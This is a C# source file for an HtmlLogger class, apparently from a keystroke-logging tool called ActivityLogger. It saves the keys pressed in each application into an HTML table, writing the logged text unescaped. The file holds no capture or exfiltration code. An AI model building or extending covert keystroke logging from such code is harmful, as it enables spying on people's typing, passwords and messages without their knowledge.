using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using ActivityLogger.Extensions;

namespace ActivityLogger.Loggers.Concrete
{
    class HtmlLogger : ILogger
    {
        private Dictionary<string, string> logData = new Dictionary<string, string>();
        
        public string LogFilePath = Application.StartupPath + @"\Acitivitylog.html";

        public void Log(string application, string value)
        {
            if(!logData.ContainsKey(application))
            {
                logData.Add(application, value);
            }
            else
            {
                logData[application] += value;
            }
        }

        public void Save(string filePath)
        {
            try
            {
                var template = FetchTemplateString();
                var markupBuilder = new StringBuilder();

                markupBuilder.AppendLine("<table><th>Application Name</th><th>Keys Pressed</th>");
                var content = String.Join("", logData.Select(x => WriteLogLine(x.Key, x.Value)));
                markupBuilder.AppendLine(content);
                markupBuilder.AppendLine("</table>");

                var outputHtml = template.Replace("{content}", markupBuilder.ToString());

                var writer = new StreamWriter(filePath, false);
                writer.WriteLine(outputHtml);
                writer.Flush();
                writer.Close();
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, ex.StackTrace);
            }
        }

        private string FetchTemplateString()
        {
            var templatePath = Path.Combine(Application.StartupPath, "Loggers","Concrete","HtmlLogTemplate.html");
            StreamReader sr = new StreamReader(templatePath);
            string template = sr.ReadLine();
            sr.Close();

            return template;
        }

        private string WriteLogLine(string application, string appLog)
        {
            return "<tr><td>"+application+"</td><td>"+appLog.NewlineToBr()+"</td></tr>";
        }
    }
}
